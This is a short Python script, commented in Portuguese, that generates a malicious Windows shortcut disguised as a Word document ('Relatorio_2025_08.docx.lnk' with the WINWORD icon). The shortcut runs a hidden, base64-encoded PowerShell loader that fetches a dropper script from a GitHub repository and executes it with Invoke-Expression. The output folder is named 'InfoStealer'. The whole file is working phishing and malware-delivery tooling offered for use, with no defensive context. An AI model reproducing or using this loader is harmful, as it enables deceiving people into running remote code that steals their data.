import base64

# Comando PowerShell para baixar e executar o dropper com headers
loader_command = (r'''
$r = Invoke-WebRequest -Uri "https://api.github.com/repos/HKenzoKimura/<example_repo>/<example_contents>/<example_Scripts/<example_dropper>.ps1" -Headers @{"Authorization"="Bearer <token>"}
$j = $r.Content | ConvertFrom-Json 
$d = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j.content)) 
Invoke-Expression $d
'''
)

# Codificar em UTF-16LE para uso com -EncodedCommand
utf16_bytes = loader_command.encode('utf-16le')
encoded_command = base64.b64encode(utf16_bytes).decode('utf-8')

# Gerar script PowerShell para criar o .lnk com aparência de .docx
lnk_script = rf"""
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\InfoStealer\LNK\Relatorio_2025_08.docx.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-EncodedCommand {encoded_command}"
$Shortcut.IconLocation = "$env:ProgramFiles\\Microsoft Office\\root\\Office16\\WINWORD.EXE,0"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
"""

# Salvar o script como create_docx_loader_lnk.ps1
with open("create_docx_loader_lnk.ps1", "w", encoding="utf-8") as f:
    f.write(lnk_script)

print("Script 'create_docx_loader_lnk.ps1' gerado com sucesso com aparência de .docx e execução oculta.")
